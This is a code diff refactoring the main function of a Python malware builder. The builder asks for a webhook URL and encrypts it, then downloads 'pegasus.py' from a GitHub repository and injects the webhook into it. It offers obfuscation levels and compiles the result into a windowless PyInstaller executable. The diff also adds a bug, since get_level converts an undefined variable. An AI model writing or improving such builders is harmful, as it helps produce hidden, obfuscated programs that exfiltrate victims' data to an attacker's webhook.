@@ -10,9 +10,7 @@ from colorama import Fore, Style, init
 from cryptography.fernet import Fernet
 
 
-def main():
-    global level, filename
-
+def main(level, filename):
     print(
         Fore.BLUE
         + """
@@ -28,23 +26,21 @@ __________
         + Style.RESET_ALL
     )
 
-    webhook = str(input(Fore.CYAN + "Webhook URL: " + Style.RESET_ALL))
-
+    webhook = input(Fore.CYAN + "Webhook URL: " + Style.RESET_ALL)
     key = Fernet.generate_key()
     token = Fernet(key).encrypt(bytes(webhook, "utf-8"))
-
-    webhook_enc = f"Fernet({key}).decrypt({token}).decode()"
+    line_to_inject = f"Fernet({key}).decrypt({token}).decode()"
 
     try:
-        r = requests.get(webhook)
-        if r.status_code != 200:
+        resp = requests.get(webhook)
+        if not resp.ok:
             print(Fore.RED + "Invalid webhook URL" + Style.RESET_ALL)
             exit()
-    except:
+    except Exception:  # TODO: Clarify exceptions
         print(Fore.RED + "Invalid webhook URL" + Style.RESET_ALL)
         exit()
 
-    filename = str(input(Fore.CYAN + "Filename: " + Style.RESET_ALL))
+    filename = input(Fore.CYAN + "Filename: " + Style.RESET_ALL)
 
     raw = requests.get(
         "https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py"
@@ -57,37 +53,56 @@ __________
     )
 
     with open(f"{filename}.py", "w", encoding="utf-8") as f:
-        f.write(raw.replace('"&WEBHOOK_URL&"', webhook_enc))
+        f.write(raw.replace('"&WEBHOOK_URL&"', line_to_inject))
 
     print(Fore.GREEN + "Done!" + Style.RESET_ALL)
 
-    level = int(input(Fore.CYAN + "Obfuscation level (1-30): " + Style.RESET_ALL))
+    level = get_level()
     Obfuscate()
 
-    compile = str(input(Fore.CYAN + "Compile? (y/n): " + Style.RESET_ALL))
+    compile = input(Fore.CYAN + "Compile? (y/n): " + Style.RESET_ALL).lower()
 
-    if compile == "y" or compile == "Y":
-        input(
-            Fore.RED
-            + "DO NOT CONTINUE IF YOU DO NOT HAVE PYTHON3 INSTALLED\nPress enter to continue..."
-            + Style.RESET_ALL
-        )
-        print(Fore.YELLOW + f"Beginning compilation..." + Style.RESET_ALL)
+    if compile != "y":
+        print("I think you said no. Please re-run the script if you said 'yes'")
+        return
 
-        os.system(r"pip install --upgrade -r .\requirements.txt")
+    input(
+        Fore.RED
+        + "DO NOT CONTINUE IF YOU DO NOT HAVE PYTHON3 INSTALLED\nPress enter to continue..."
+        + Style.RESET_ALL
+    )
+    print(Fore.YELLOW + f"Beginning compilation..." + Style.RESET_ALL)
 
-        os.system(
-            f"python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\{filename}-obfuscated.py"
-        )
+    # Install requirements
+    os.system(r"pip install --upgrade -r .\requirements.txt")
 
-        shutil.rmtree(r".\build")
-        shutil.rmtree(r".\__pycache__")
-        os.remove(f".\{filename}-obfuscated.spec")
+    # Build the executable
+    os.system(
+        f"python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\{filename}-obfuscated.py"
+    )
 
-        input(Fore.GREEN + "Done!\nPress enter to exit..." + Style.RESET_ALL)
+    shutil.rmtree(r".\build")
+    shutil.rmtree(r".\__pycache__")
+    os.remove(f".\{filename}-obfuscated.spec")
 
-    else:
-        exit()
+    input(Fore.GREEN + "Done!\nPress enter to exit..." + Style.RESET_ALL)
+
+
+def get_level():
+    while True:
+        raw = input(Fore.CYAN + "Obfuscation level (1-30): " + Style.RESET_ALL)
+        num = str_to_int(num)
+
+        if isinstance(num, int):
+            return num
+        print("Level is not a number!\nTry again")
+
+
+def str_to_int(num: str) -> int:
+    try:
+        return int(num)
+    except ValueError:
+        return num
 
 
 class Obfuscate:
